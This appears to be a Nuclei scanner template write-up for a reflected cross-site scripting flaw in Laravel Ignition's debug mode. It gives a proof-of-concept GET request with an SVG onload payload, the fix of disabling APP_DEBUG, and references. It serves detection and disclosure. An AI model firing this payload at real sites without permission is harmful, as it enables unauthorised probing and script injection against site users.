# Nuclei Template: Laravel Ignition - Cross-Site Scripting
**Template ID:** laravel-ignition-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`laravel-ignition-xss.yaml`)

## Vulnerability Information & PoC

## Description
Laravel Ignition contains a cross-site scripting vulnerability when debug mode is enabled.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/_ignition/scripts/--><svg%20onload=alert(document.domain)>
```

## Remediation
Disable debug mode by setting APP_DEBUG to false.

## References
- https://www.acunetix.com/vulnerabilities/web/laravel-ignition-reflected-cross-site-scripting/
- https://github.com/facade/ignition/issues/273
